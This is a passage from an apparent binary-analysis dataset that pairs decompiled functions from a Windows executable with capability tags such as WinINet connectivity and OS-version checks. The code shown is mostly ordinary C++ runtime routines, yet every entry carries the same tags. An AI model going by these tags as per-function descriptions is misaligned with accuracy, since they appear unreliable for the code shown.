*0x48e22c ^ &stack0xfffffffc;\n    puStack20 = &stack0xffffff64;\n    *in_FS_OFFSET = &fcn.00401f00::var_ch_2;\n    var_30h = 0;\n    uVar10 = 0;\n    var_28h = 0;\n    var_2ch = param_1;\n    var_24h = param_1;\n    var_14h_2 = uStack156;\n    fcn.00401d30(param_1);\n    if (var_38h == '\\0') goto code_r0x00402102;\n    piVar1 = *(*(*(*param_1 + 4) + 0x30 + param_1) + 4);\n    (**(*piVar1 + 4))();\n    uVar10 = 0x401f71;\n    fcn.00404b8c(0);\n    var_40h = *0x48f134;\n    var_20h = *0x48f128;\n    if (*0x48f128 == 0) {\n        uVar10 = *0x48f128;\n        fcn.00404b8c(0);\n        if (*0x48f128 == 0) {\n            *0x48f128 = *0x48f208 + 1;\n            *0x48f208 = *0x48f128;\n        }\n        fcn.00404be4();\n    }\n    var_18h = *0x48f128 * 4;\n    var_20h = *0x48f128;\n    if (*0x48f128 < piVar1[3]) {\n        iVar4 = *(var_18h + piVar1[2]);\n        if (iVar4 == 0) goto code_r0x00401fda;\n    }\n    else {\n        iVar4 = 0;\ncode_r0x00401fda:\n        if (*(piVar1 + 5) == '\\0') {\ncode_r0x00401ff8:\n            if (iVar4 != 0) goto code_r0x0040206b;\n        }\n        else {\n            iVar4 = fcn.00404f6d();\n            if (var_20h < *(iVar4 + 0xc)) {\n                iVar4 = *(var_18h + *(iVar4 + 8));\n                goto code_r0x00401ff8;\n            }\n        }\n        if (var_40h == NULL) {\n            arg_8h = fcn.00406d89(8, uVar10);\n            if (arg_8h == NULL) {\n                arg_8h = NULL;\n                uVar10 = var_30h;\n            }\n            else {\n                piVar5 = piVar1[6];\n                if (piVar5 == NULL) {\n                    piVar5 = piVar1 + 7;\n                }\n                fcn.00401890(piVar5);\n                arg_8h[1] = NULL;\n                *arg_8h = \n                vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n                uVar10 = 1;\n            }\n            if ((uVar10 & 1) != 0) {\n                fcn.00401e40();\n            }\n            fcn.00404f41(arg_8h);\n            (**(*arg_8h + 4))();\n            *0x48f134 = arg_8h;\n        }\n    }\ncode_r0x0040206b:\n    fcn.00404be4();\n    puVar6 = (**(*piVar1 + 8))();\n    if (puVar6 != NULL) {\n        (***puVar6)();\n    }\n    var_4h = 0;\n    uVar10 = *(*var_24h + 4);\n    unaff_EBX = uVar10 & 0xffffff00 | *(var_24h + uVar10 + 0x40);\n    var_30h = *(var_24h + uVar10 + 0x38);\n    var_34h = var_34h & 0xffffff00;\n    uStack156 = var_34h;\n    pcVar7 = fcn.00404a00(&fcn.00401f00::var_34h);\n    uVar10 = 0;\n    if (*pcVar7 != '\\0') {\n        uVar10 = 4;\n    }\n    var_4h = 0xffffffff;\n    param_1 = var_24h;\n    var_28h = uVar10;\ncode_r0x00402102:\n    uVar9 = 4;\n    iVar4 = *(*param_1 + 4);\n    if (*(param_1 + iVar4 + 0x38) != 0) {\n        uVar9 = 0;\n    }\n    uVar10 = uVar9 | *(param_1 + iVar4 + 0xc) & 0x17 | uVar10;\n    *(param_1 + iVar4 + 0xc) = uVar10;\n    uVar10 = *(param_1 + iVar4 + 0x10) & uVar10;\n    if (uVar10 != 0) {\n        if ((uVar10 & 4) == 0) {\n            pcVar7 = \"ios_base::failbit set\";\n            if ((uVar10 & 2) == 0) {\n                pcVar7 = \"ios_base::eofbit set\";\n            }\n        }\n        else {\n            pcVar7 = \"ios_base::badbit set\";\n        }\n        uVar8 = fcn.00404800(&fcn.00401f00::var_3ch, 1);\n        fcn.00401c60(pcVar7, uVar8);\n        fcn.00407c30(&fcn.00401f00::var_54h, 0x430780);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    cVar3 = fcn.00404da8();\n    if (cVar3 == '\\0') {\n        fcn.00403180();\n    }\n    piVar1 = *(*(*var_3ch + 4) + 0x38 + var_3ch);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.00406dcc(unaff_EBX);\n    return;\n}\n",
        "token_count": 1775
    },
    "004029e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004029e0(uint param_1, uint *****param_2, uint param_3, uint param_4, int32_t param_5, uint param_6, \n                 char *param_7, uchar *param_8)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *****pppppuVar3;\n    uchar uVar4;\n    uint8_t **ppuVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    uint *****pppppuVar8;\n    int32_t *piVar9;\n    int32_t *****pppppiVar10;\n    uint arg_ch;\n    uint unaff_EBX;\n    uchar *puVar11;\n    uchar *unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t iVar12;\n    uint unaff_retaddr;\n    uchar *puVar13;\n    uchar *arg_8h;\n    int32_t *piVar14;\n    uchar auStack80 [4];\n    int32_t *****pppppiStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uint *****pppppuStack60;\n    uint uStack56;\n    uint *****pppppuStack52;\n    uchar auStack48 [8];\n    uint32_t uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint uStack20;\n    uint uStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ auStack80;\n    pppppuStack60 = param_2;\n    iStack72 = param_5;\n    if ((param_8 == NULL) || ((*param_7 != '+' && (*param_7 != '-')))) {\n        puVar11 = NULL;\n    }\n    else {\n        puVar11 = 0x1;\n    }\n    if ((*(param_5 + 0x14) & 0x3000) == 0x3000) {\n        arg_ch = 0x42450c;\n        if (((puVar11 + 2 <= param_8) && (puVar11[param_7] == '0')) &&\n           (((puVar11 + 1)[param_7] == 'x' || ((puVar11 + 1)[param_7] == 'X')))) {\n            puVar11 = puVar11 + 2;\n        }\n    }\n    else {\n        arg_ch = 0x424508;\n    }\n    uStack64 = fcn.0040d620(param_7, arg_ch);\n    uStack56 = CONCAT22(uStack56._2_2_, 0x2e);\n    ppuVar5 = fcn.0040d666();\n    uStack56 = uStack56 & 0xffffff00 | **ppuVar5;\n    puVar6 = fcn.0040d620(param_7, &uStack56);\n    pppppiStack76 = *(*(iStack72 + 0x30) + 4);\n    (*(*pppppiStack76)[1])();\n    uStack68 = fcn.00401430();\n    if ((pppppiStack76 != NULL) && (puVar7 = (*(*pppppiStack76)[2])(),  puVar7 != NULL)) {\n        (***puVar7)();\n    }\n    arg_8h = param_8;\n    fcn.004017b0();\n    pppppuVar8 = &pppppuStack60;\n    if (0xf < uStack40) {\n        pppppuVar8 = pppppuStack60;\n    }\n    (*(*pppppiStack76)[7])(param_7, param_8 + param_7, pppppuVar8);\n    piVar14 = *(*(unaff_ESI + 0x30) + 4);\n    (**(*piVar14 + 4))();\n    piVar9 = fcn.00401590(&stack0xffffff9c);\n    if ((piVar14 != NULL) && (puVar7 = (**(*piVar14 + 8))(),  puVar7 != NULL)) {\n        (***puVar7)(1);\n    }\n    puVar13 = auStack48;\n    (**(*piVar9 + 0x14))(puVar13);\n    (**(*piVar9 + 0x10))();\n    if (puVar6 != param_8) {\n        uVar4 = (**(*piVar9 + 0xc))();\n        pppppiVar10 = &pppppiStack76;\n        if (0xf < uStack56) {\n            pppppiVar10 = pppppiStack76;\n        }\n        *(pppppiVar10 + puVar6) = uVar4;\n    }\n    if (puVar6 == param_8) {\n        puVar6 = unaff_EBP;\n    }\n    pppppuVar8 = &pppppuStack52;\n    if (0xf < uStack32) {\n        pppppuVar8 = pppppuStack52;\n    }\n    cVar1 = *pppppuVar8;\n    pppppuVar3 = pppppuStack60;\n    while (((pppppuStack60 = pppppuVar3,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < puVar6 - puVar11))) {\n        puVar6 = puVar6 + -cVar1;\n        puVar13 = puVar6;\n        fcn.00404640();\n        if ('\\0' < *(pppppuVar8 + 1)) {\n            pppppuVar8 = pppppuVar8 + 1;\n        }\n        pppppuVar3 = pppppuStack60;\n        cVar1 = *pppppuVar8;\n    }\n    pppppuVar8 = piVar14[8];\n    if (((piVar14[9] < 0) || ((piVar14[9] < 1 && (pppppuVar8 == NULL)))) || (pppppuVar8 <= pppppuVar3)) {\n        iVar12 = 0;\n    }\n    else {\n        iVar12 = pppppuVar8 - pppppuVar3;\n    }\n    if ((piVar14[5] & 0x1c0U) == 0x40) {\n        pppppiVar10 = &pppppiStack76;\n        if (0xf < uStack56) {\n            pppppiVar10 = pppppiStack76;\n        }\n        puVar7 = fcn.00403210(uStack20, &stack0xffffff98, uStack12, uStack8, pppppiVar10, puVar11, puVar13);\n    }\n    else if ((piVar14[5] & 0x1c0U) == 0x100) {\n        pppppiVar10 = &pppppiStack76;\n        if (0xf < uStack56) {\n            pppppiVar10 = pppppiStack76;\n        }\n        puVar7 = fcn.00403210(uStack20, &stack0xffffff98, uStack12, uStack8, pppppiVar10, puVar11, puVar13);\n        uStack12 = *puVar7;\n        uStack8 = puVar7[1];\n        puVar7 = fcn.00403290(uStack20, &stack0xffffff98, uStack12, uStack8, unaff_retaddr, iVar12);\n        iVar12 = 0;\n    }\n    else {\n        puVar7 = fcn.00403290(uStack20, &stack0xffffff98, uStack12, uStack8, unaff_retaddr, iVar12);\n        iVar12 = 0;\n        uStack12 = *puVar7;\n        uStack8 = puVar7[1];\n        pppppiVar10 = &pppppiStack76;\n        if (0xf < uStack56) {\n            pppppiVar10 = pppppiStack76;\n        }\n        puVar7 = fcn.00403210(uStack20, &stack0xffffff98, uStack12, uStack8, pppppiVar10, puVar11);\n    }\n    uStack8 = puVar7[1];\n    uStack12 = *puVar7;\n    pppppiVar10 = &pppppiStack76;\n    if (0xf < uStack56) {\n        pppppiVar10 = pppppiStack76;\n    }\n    puVar7 = fcn.00403210(uStack20, &stack0xffffff98, uStack12, uStack8, pppppiVar10 + puVar11, pppppuVar3 - puVar11, \n                          puVar13);\n    uStack12 = *puVar7;\n    uStack8 = puVar7[1];\n    piVar14[8] = 0;\n    piVar14[9] = 0;\n    fcn.00403290(uStack20, unaff_EBX, uStack12, uStack8, unaff_retaddr, iVar12);\n    if (0xf < uStack32) {\n        pppppuVar8 = pppppuStack52;\n        if ((0xfff < uStack32 + 1) && (pppppuVar8 = pppppuStack52[-1],  0x1f < pppppuStack52 + (-4 - pppppuVar8)))\n        goto code_r0x00402dd2;\n        fcn.00406db9(pppppuVar8);\n    }\n    uStack36 = 0;\n    uStack32 = 0xf;\n    pppppuStack52 = pppppuStack52 & 0xffffff00;\n    if (0xf < uStack56) {\n        pppppiVar10 = pppppiStack76;\n        if ((0xfff < uStack56 + 1) && (pppppiVar10 = pppppiStack76[-1],  0x1f < pppppiStack76 + (-4 - pppppiVar10))) {\ncode_r0x00402dd2:\n            fcn.0040b82f();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.00406db9(pppppiVar10);\n    }\n    fcn.00406dcc(arg_8h);\n    return;\n}\n",
        "token_count": 2316
    },
    "00402df0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402df0(uint param_1, uint32_t param_2, uint param_3, uint param_4, int32_t param_5, uint param_6, \n                 char *param_7, int32_t *param_8)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    char *pcVar10;\n    int32_t *piVar11;\n    int32_t *unaff_EBP;\n    int32_t iVar12;\n    uint unaff_retaddr;\n    char *var_20h;\n    uint var_30h;\n    int32_t *arg_8h;\n    int32_t *piStack88;\n    uint uStack68;\n    uchar auStack64 [4];\n    int32_t *piStack60;\n    uint32_t uStack56;\n    char *pcStack52;\n    int32_t aiStack48 [2];\n    uint32_t uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint uStack20;\n    uint uStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ &stack0xffffffbc;\n    uStack56 = param_2;\n    if ((param_8 == NULL) || ((*var_20h != '+' && (*var_20h != '-')))) {\n        piVar11 = NULL;\n    }\n    else {\n        piVar11 = 0x1;\n    }\n    if (((((*(param_5 + 0x14) & 0xe00) == 0x800) && (piVar11 + 2U <= param_8)) && (var_20h[piVar11] == '0')) &&\n       (((var_20h + 1)[piVar11] == 'x' || ((var_20h + 1)[piVar11] == 'X')))) {\n        piVar11 = piVar11 + 2U;\n    }\n    piStack60 = *(*(param_5 + 0x30) + 4);\n    piStack88 = 0x402e68;\n    (**(*piStack60 + 4))();\n    piStack88 = &stack0xffffffc0;\n    uStack68 = fcn.00401430();\n    if (piStack60 != NULL) {\n        piStack88 = 0x402e86;\n        puVar5 = (**(*piStack60 + 8))();\n        if (puVar5 != NULL) {\n            piStack88 = 0x1;\n            (***puVar5)();\n        }\n    }\n    piStack88 = NULL;\n    arg_8h = param_8;\n    fcn.004017b0();\n    piVar6 = &stack0xffffffc4;\n    if (0xf < uStack40) {\n        piVar6 = piStack60;\n    }\n    (**(*unaff_EBP + 0x1c))(var_20h, param_8 + var_20h, piVar6);\n    piVar6 = *(*(param_5 + 0x30) + 4);\n    (**(*piVar6 + 4))();\n    piVar7 = fcn.00401590(&stack0xffffffac);\n    piStack88 = piVar7;\n    if ((piVar6 != NULL) && (puVar5 = (**(*piVar6 + 8))(),  puVar5 != NULL)) {\n        (***puVar5)(1);\n    }\n    piVar7 = &stack0xffffffd0;\n    (**(*piVar7 + 0x14))(piVar7);\n    pcVar10 = &stack0xffffffcc;\n    if (0xf < uStack32) {\n        pcVar10 = pcStack52;\n    }\n    if ((*pcVar10 != '\\x7f') && ('\\0' < *pcVar10)) {\n        uVar4 = (**(*arg_8h + 0x10))();\n        arg_8h = arg_8h & 0xffffff00 | uVar4;\n        cVar1 = *pcVar10;\n        while (((cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < param_8 - piVar11))) {\n            param_8 = param_8 - cVar1;\n            piVar7 = param_8;\n            fcn.00404640();\n            if ('\\0' < pcVar10[1]) {\n                pcVar10 = pcVar10 + 1;\n            }\n            cVar1 = *pcVar10;\n        }\n    }\n    piVar3 = piStack60;\n    piVar9 = *(param_5 + 0x20);\n    if (((*(param_5 + 0x24) < 0) || ((*(param_5 + 0x24) < 1 && (piVar9 == NULL)))) || (piVar9 <= piStack60)) {\n        iVar12 = 0;\n    }\n    else {\n        iVar12 = piVar9 - piStack60;\n    }\n    uVar8 = *(param_5 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        piVar9 = &stack0xffffffb4;\n        if (0xf < uStack56) {\n            piVar9 = unaff_EBP;\n        }\n        puVar5 = fcn.00403210(uStack20, &stack0xffffffa8, uStack12, uStack8, piVar9, piVar11, piVar7);\n    }\n    else if (uVar8 == 0x100) {\n        piVar9 = &stack0xffffffb4;\n        if (0xf < uStack56) {\n            piVar9 = unaff_EBP;\n        }\n        puVar5 = fcn.00403210(uStack20, &stack0xffffffa8, uStack12, uStack8, piVar9, piVar11, piVar7);\n        uStack12 = *puVar5;\n        uStack8 = puVar5[1];\n        puVar5 = fcn.00403290(uStack20, &stack0xffffffa8, uStack12, uStack8, unaff_retaddr, iVar12);\n        iVar12 = 0;\n    }\n    else {\n        puVar5 = fcn.00403290(uStack20, &stack0xffffffa8, uStack12, uStack8, unaff_retaddr, iVar12);\n        iVar12 = 0;\n        uStack12 = *puVar5;\n        uStack8 = puVar5[1];\n        piVar9 = &stack0xffffffb4;\n        if (0xf < uStack56) {\n            piVar9 = unaff_EBP;\n        }\n        puVar5 = fcn.00403210(uStack20, &stack0xffffffa8, uStack12, uStack8, piVar9, piVar11);\n    }\n    uStack8 = puVar5[1];\n    uStack12 = *puVar5;\n    piVar9 = &stack0xffffffb4;\n    if (0xf < uStack56) {\n        piVar9 = unaff_EBP;\n    }\n    puVar5 = fcn.00403210(uStack20, &stack0xffffffa8, uStack12, uStack8, piVar9 + piVar11, piVar3 - piVar11, piVar7);\n    uStack12 = *puVar5;\n    uStack8 = puVar5[1];\n    *(param_5 + 0x20) = 0;\n    *(param_5 + 0x24) = 0;\n    fcn.00403290(uStack20, piVar6, uStack12, uStack8, unaff_retaddr, iVar12);\n    if (0xf < uStack32) {\n        pcVar10 = pcStack52;\n        if ((0xfff < uStack32 + 1) && (pcVar10 = *(pcStack52 + -4),  0x1f < pcStack52 + (-4 - pcVar10)))\n        goto code_r0x0040316e;\n        fcn.00406db9(pcVar10);\n    }\n    uStack36 = 0;\n    uStack32 = 0xf;\n    pcStack52 = pcStack52 & 0xffffff00;\n    if (0xf < uStack56) {\n        piVar11 = unaff_EBP;\n        if ((0xfff < uStack56 + 1) && (piVar11 = unaff_EBP[-1],  0x1f < unaff_EBP + (-4 - piVar11))) {\ncode_r0x0040316e:\n            fcn.0040b82f();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.00406db9(piVar11);\n    }\n    fcn.00406dcc(arg_8h);\n    return;\n}\n",
        "token_count": 2024
    },
    "00403650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403650(int32_t param_1, uint32_t param_2, char param_3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    char *pcVar4;\n    \n    *(param_1 + 0xc) = param_2 & 0x17;\n    uVar3 = *(param_1 + 0x10) & param_2 & 0x17;\n    if (uVar3 != 0) {\n        if (param_3 != '\\0') {\n            fcn.00407c30(0, 0);\n            uVar3 = extraout_ECX;\n        }\n        if ((uVar3 & 4) == 0) {\n            pcVar4 = \"ios_base::failbit set\";\n            if ((uVar3 & 2) == 0) {\n                pcVar4 = \"ios_base::eofbit set\";\n            }\n        }\n        else {\n            pcVar4 = \"ios_base::badbit set\";\n        }\n        uVar2 = fcn.00404800(&stack0xffffffdc, 1);\n        fcn.00401c60(pcVar4, uVar2);\n        fcn.00407c30(&stack0xffffffdc, 0x430780);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "00404a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00404a60(int32_t *param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*param_1[8] != 0) {\n        iVar1 = *param_1[0xc];\n        if (0 < iVar1) {\n            *param_1[0xc] = iVar1 + -1;\n            puVar2 = *param_1[8];\n            *param_1[8] = puVar2 + 1;\n            *puVar2 = param_2;\n            return param_2;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00404a98. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar3 = (**(*param_1 + 0xc))();\n    return uVar3;\n}\n",
        "token_count": 211
    },
    "004051f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004051f3(uint32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    int32_t iVar2;\n    uint arg_14h;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = fcn.0040db49();\n        iVar1 = *(iVar1 + 8);\n        CodePage = fcn.0040db24();\n    }\n    else {\n        iVar1 = arg_ch[3];\n        CodePage = *arg_ch;\n    }\n    if (iVar1 == 0) {\n        if (arg_8h < 0x41) {\n            return arg_8h;\n        }\n        if (0x5a < arg_8h) {\n            return arg_8h;\n        }\n        return arg_8h + 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (arg_ch == NULL) {\n            iVar2 = fcn.0040daa0(arg_8h);\n            if (iVar2 == 0) {\n                return arg_8h;\n            }\ncode_r0x0040529a:\n            iVar2 = fcn.0040d9dd();\n            uVar3 = *(iVar2 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\n            goto code_r0x00405280;\n        }\n        if ((*(arg_ch[1] + arg_8h * 2) & 1) == 0) {\n            return arg_8h;\n        }\n    }\n    else if (arg_ch == NULL) goto code_r0x0040529a;\n    uVar3 = *(arg_ch[1] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\ncode_r0x00405280:\n    if (uVar3 == 0) {\n        var_4h._1_1_ = 0;\n        arg_14h = 1;\n        var_4h._0_1_ = arg_8h;\n    }\n    else {\n        var_4h._2_1_ = 0;\n        arg_14h = 2;\n        var_4h._0_1_ = arg_8h >> 8;\n        var_4h._1_1_ = arg_8h;\n    }\n    iVar1 = fcn.00406a5f(iVar1, 0x100, &var_4h, arg_14h, &var_8h, 3, CodePage, 1);\n    if ((iVar1 != 0) && (arg_8h = var_8h,  iVar1 != 1)) {\n        arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 689
    },
    "00405372": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00405372(uint32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    int32_t iVar2;\n    uint arg_14h;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = fcn.0040db49();\n        iVar1 = *(iVar1 + 8);\n        CodePage = fcn.0040db24();\n    }\n    else {\n        iVar1 = arg_ch[3];\n        CodePage = *arg_ch;\n    }\n    if (iVar1 == 0) {\n        if (arg_8h < 0x61) {\n            return arg_8h;\n        }\n        if (0x7a < arg_8h) {\n            return arg_8h;\n        }\n        return arg_8h - 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (arg_ch == NULL) {\n            iVar2 = fcn.0040da10(arg_8h);\n            if (iVar2 == 0) {\n                return arg_8h;\n            }\ncode_r0x00405419:\n            iVar2 = fcn.0040d9dd();\n            uVar3 = *(iVar2 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\n            goto code_r0x004053ff;\n        }\n        if ((*(arg_ch[1] + arg_8h * 2) & 2) == 0) {\n            return arg_8h;\n        }\n    }\n    else if (arg_ch == NULL) goto code_r0x00405419;\n    uVar3 = *(arg_ch[1] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\ncode_r0x004053ff:\n    if (uVar3 == 0) {\n        var_4h._1_1_ = 0;\n        arg_14h = 1;\n        var_4h._0_1_ = arg_8h;\n    }\n    else {\n        var_4h._2_1_ = 0;\n        arg_14h = 2;\n        var_4h._0_1_ = arg_8h >> 8;\n        var_4h._1_1_ = arg_8h;\n    }\n    iVar1 = fcn.00406a5f(iVar1, 0x200, &var_4h, arg_14h, &var_8h, 3, CodePage, 1);\n    if ((iVar1 != 0) && (arg_8h = var_8h,  iVar1 != 1)) {\n        arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 685
    },
    "00405781": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405781(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4235f4;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x48e22c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    if (param_1[0x13] != NULL) {\n        fcn.00405dad(uVar1);\n    }\n    if (*(param_1 + 0x12) != '\\0') {\n        fcn.00405e6a();\n    }\n    fcn.00405823();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 216
    },
    "00405c09": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405c09(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = *(in_ECX + 4);\n    if (arg_8h < *(iVar1 + 0xc)) {\n        iVar2 = *(*(iVar1 + 8) + arg_8h * 4);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    else {\n        iVar2 = 0;\n    }\n    if (*(iVar1 + 0x14) != '\\0') {\n        iVar1 = fcn.00404f6d();\n        if (arg_8h < *(iVar1 + 0xc)) {\n            iVar2 = *(*(iVar1 + 8) + arg_8h * 4);\n        }\n        else {\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 215
    },
    "004079f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004079f5(void)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar1 != NULL) && (*piVar1 == 0x5a4d)) && (piVar2 = *(piVar1 + 0x1e) + piVar1,  *piVar2 == 0x4550)) &&\n       ((piVar1 = 0x10b,  *(piVar2 + 6) == 0x10b && (0xe < piVar2[0x1d])))) {\n        return CONCAT31(1, piVar2[0x3a] != 0);\n    }\n    return piVar1 & 0xffffff00;\n}\n",
        "token_count": 188
    },
    "0040ad51": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ad51(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x30);\n    fcn.00407f37(*(unaff_EBP + -0x34));\n    iVar1 = fcn.0040a1bc();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x38);\n    iVar1 = fcn.0040a1bc();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x3c);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || ((unaff_ESI[5] == 0x19930521 || (unaff_ESI[5] == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x40) == 0 && (unaff_EBX != 0)))) {\n        iVar1 = fcn.00408854(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040874e(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0040af3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
